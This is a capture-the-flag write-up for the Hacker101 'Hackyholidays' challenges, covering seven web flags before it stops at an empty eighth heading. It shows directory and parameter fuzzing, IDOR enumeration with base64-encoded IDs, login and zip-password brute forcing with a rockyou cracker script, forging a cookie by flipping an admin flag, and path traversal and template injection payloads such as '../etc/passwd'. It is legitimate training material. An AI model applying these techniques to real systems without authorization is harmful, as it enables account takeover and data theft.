# Hackyholidays CTF

## Description
This write up will show how to solve the CTF for "Hackyholidays CTF"

**Difficulty:** Moderate

## Solution 1st flag
Fuzzing for files and directories, I get the following result:</br>
```
assets
favicon.ico
forum
robots.txt
```
When going to `https://c7e947b150b633c436c698e00271600a.ctf.hacker101.com/robots.txt`, it will show the first flag.</br>

## Solution 2nd flag
When go to robots.txt, besides the flag, it shows another hidden directory: `/s3cr3t-ar3a`</br>
Going to `https://c7e947b150b633c436c698e00271600a.ctf.hacker101.com/s3cr3t-ar3a`, it will show the page has moved.</br>
In Burp it doesn't show, but in Elements inspector, it shows the flag.</br>

## Solution 3rd flag
The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!</br>

In `/s3cr3t-ar3a`, it also shows a next-page `apps-home`</br>
In `/apps-home`, it shows the boxes of all the different challenges:</br>
```
3 /people-rater: The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!
4 /swag-shop: Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.
5 /secure-login: Try and find a way past the login page to get to the secret area.
6 /my-diary: Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?
7 /hate-mail-generator: Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!
8 /forum: The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!
9 /evil-quiz: Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
10 /signup-manager: You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
```
Looking at `/people-rater`, it shows a list of people. When clicked on a person it will show a Javascript alert with the Grinch's opinion of that person.</br>
When inspecting the Javascript code, it refers to `/entry/?id=` + the data-id.</br>
The id's seem to be base64 encoded. Hence, first I decoded one example to understand what the encoded string contains: `{"id":1}`</br>
I had a list of 1000 numbers, hence I created a Python script to use that list to create a list in the above format:
```
import base64

# Read numbers from file
with open('1000_numbers.txt', 'r') as file:
    numbers = [int(line.strip()) for line in file]

# Convert numbers to base64
base64_list = [base64.b64encode((str('{"id":') + str(num) + str('}')).encode()).decode() for num in numbers]

# Save base64 representations to file
with open('1000_numbers_base64.txt', 'w') as output_file:
    for base64_num in base64_list:
        output_file.write(base64_num + '\n')
```
Once I had the list, I fuzz the id's, with the following result:</br>
```
eyJpZCI6OH0=            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6M30=            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6MTV9            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6Nn0=            [Status: 200, Size: 68, Words: 2, Lines: 1]
eyJpZCI6Mn0=            [Status: 200, Size: 57, Words: 2, Lines: 1]
eyJpZCI6MTF9            [Status: 200, Size: 69, Words: 2, Lines: 1]
eyJpZCI6MTN9            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6N30=            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6NX0=            [Status: 200, Size: 63, Words: 2, Lines: 1]
eyJpZCI6MTB9            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6NH0=            [Status: 200, Size: 62, Words: 2, Lines: 1]
eyJpZCI6MTd9            [Status: 200, Size: 64, Words: 2, Lines: 1]
eyJpZCI6MTR9            [Status: 200, Size: 58, Words: 2, Lines: 1]
eyJpZCI6MTJ9            [Status: 200, Size: 59, Words: 2, Lines: 1]
eyJpZCI6MX0=            [Status: 200, Size: 169, Words: 6, Lines: 1]
eyJpZCI6OX0=            [Status: 200, Size: 66, Words: 2, Lines: 1]
eyJpZCI6MTZ9            [Status: 200, Size: 62, Words: 2, Lines: 1]
```
One line item stands out with the size: `eyJpZCI6MX0=`</br>
Going to `/people-rater/entry/?id=eyJpZCI6MX0=` it will show the flag.</br>

## Solution 4th flag
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.</br>

The next challenge is the `/swag-shop` to try and find the Grinch's personal details.</br>
Checking the source code, it looked like there are api's, f.e. `/api/stock`.</br>
Fuzz to see if there are other api's: `ffuf -w api-endpoints-res.txt -u https://ca184d43d40fce19e231bfb1b49700b2.ctf.hacker101.com/swag-shop/api/FUZZ -fc 404`</br>
This resulted in the following:</br>
```
sessions
?:
user
```
`sessions` returns a list of sessions.</br>
`user` returns an error: `{"error":"Missing required fields"}`, hence we might need to provide more details.</br>
Fuzz for the required fields `wfuzz --hc=302,404 zfile,burp-parameter-names.txt https://ca184d43d40fce19e231bfb1b49700b2.ctf.hacker101.com/swag-shop/api/user/?FUZZ=1`</br>
The required field is: `uuid`:</br>
```
000006194:   404        0 L      5 W        40 Ch       "uuid"
```

uuid=1 however, is an invalid uuid, hence look at the sessions.</br>
They all seemed to be encoded with base64.</br>
When pasting all of it in cyberchef.io, it showed the following:</br>
```
{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="}{"user":null,"cookie":"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="}
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}{"user":null,"cookie":"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="}{"user":null,"cookie":"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="}{"user":null,"cookie":"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="}{"user":null,"cookie":"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="}{"user":null,"cookie":"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="}
```
There is 1 user with an active session, user: `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`</br>

Let's use this value as a uuid.</br>
Going to `https://ca184d43d40fce19e231bfb1b49700b2.ctf.hacker101.com/swag-shop/api/user/?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` will show the details of the Grinch and the flag.</br>

## Solution 5th flag
Try and find a way past the login page to get to the secret area.</br>

This challenge shows a log in page and there is not much more given than it is a secure login.</br>
When logging in with a random user it will show `Invalid Username`</br>
This means we can bruteforce an existing user.</br>
In Burp, using Turbo Intruder we found the user: `access`</br>

Now we can try to bruteforce the password.</br>
The password is `computer`</br>
When logging in, it provides a securlogin cookie: `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`
Based on `%3D` at the end, we know that the cookie is URL encoded and then it looks like it is Base64 encoded.</br>
When decoding the cookie, we get: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`</br>
Let's forward the request with the cookie, but first change the cookie to: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}`, where admin is true:</br>
`eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3D%3D`</br>
When logged in, it shows a zip-file: `my_secure_files_not_for_you.zip`</br>
To unzip any of the files, a password is needed, but at least it shows `flag.txt` and `xxx.jpg`, so we're close.</br>

Online I found a Python script to bruteforce the zip file:</br>
```
#!/bin/python3
import zipfile

def crack_password(password_list, obj):
    # tracking line no. at which password is found
    idx = 0

    # open file in read byte mode only as "rockyou.txt"
    # file contains some special characters and hence
    # UnicodeDecodeError will be generated
    with open(password_list, 'rb') as file:
        for line in file:
            for word in line.split():
                try:
                    idx += 1
                    obj.extractall(pwd=word)
                    print("Password found at line", idx)
                    print("Password is", word.decode())
                    return True
                except:
                    continue
    return False

password_list = "rockyou-75.txt"

zip_file = "my_secure_files_not_for_you.zip"

# ZipFile object initialised
obj = zipfile.ZipFile(zip_file)

# count of number of words present in file
cnt = len(list(open(password_list, "rb")))

print("There are total", cnt,
      "number of passwords to test")

if crack_password(password_list, obj) == False:
    print("Password not found in this file")
```
The rockyou-75.txt contains the password `hahahaha`.</br>
Open the file flag.txt and you've got the flag.</br>

## Solution 6th flag
Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?</br>

When opening the page and inspecting the request, it has the following GET request: `/my-diary/?template=entries.html`</br>
Fuzzing for other parameters did not returned any results. It will always redirect to `template`.</br>
And also `entries.html` is the only file I could fuzz for.</br>

Try to replace `entries.html` with `../../../../../etc/passwd` didn't result in anything either.</br>
If the template is loading files relative to its own directory, it might work with `index.php`.</br>
This works and will show the php code:</br>
```
<?php
include_once('../../Flags.php');
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
        $contents = file_get_contents($page);
        $contents = str_replace('!'.'FLAG!',Flags::get(5),$contents);
        echo $contents;
    }else{
        //redirect to home
        header("Location: ../my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: ../my-diary/?template=entries.html");
    exit();
}
```

There is a file `admin.php` and `secretadmin.php`.</br>
These are not accessible directly due to various replace operations in the above mentioned code.</br>
However, `secretadmin.php` will return: `You cannot view this page from your IP Address`</br>
`admin.php` is replaced by nothing `''`</br>
`secretadmin.php` is replaced by `''` voor `admin.php`, resulting in `secret`</br>
In the end we want to end up with `secretadsecretaadmin.phpdmin.phpmin.php`.</br>
`admin.php` in the middle will be replaced with nothing, resulting in `secretadsecretadmin.phpmin.php`</br>
Then `secretadmin.php` will be replaced with nothing, resulting in `secretadmin.php`</br>
Hence, going to: `https://b43b6a4b819e36587e6f22e21cf3ac9a.ctf.hacker101.com/my-diary/secretadsecretaadmin.phpdmin.phpmin.php`</br>

This will show the flag and the event `Launch DDoS Against Santa's Workshop!`</br>

## Solution 7th flag
Fuzzing for endpoints, it showed `new` and the following `templates`:
```
* cbdj3_grinch_header.html
* cbdj3_grinch_footer.html
* 38dhs_admins_only_header.html
```

When looking at the existing mail campaign 'Guess What', it includes templates inside the Markup as `{{template:....}}`</br>
Include the template `38dhs_admins_only_header.html`: `{{template:38dhs_admins_only_header.html}}`</br>

This will return:
`You do not have access to the file 38dhs_admins_only_header.html`

When trying to apply directory traversal with template injection: `{{template:../../../../../../../../../etc/passwd}}` it is escaping all the forward slashes</br>
The same is happening for the following:
```
{{template:..//..//..//..//..//..//..//..//..//etc/passwd}}
{{template:..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd}}
{{template:..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd}}
```
When inspecting the source code, there is an HTML block with 2 hidden fields.</br>
I deleted the hidden property in the source code, replace the value `Alice` in the `name` field with `{{template:38dhs_admins_only_header.html}}` and added `\`\`` in the preview-markup.</br>
This provides the flag.</br>

## Solution 8th flag
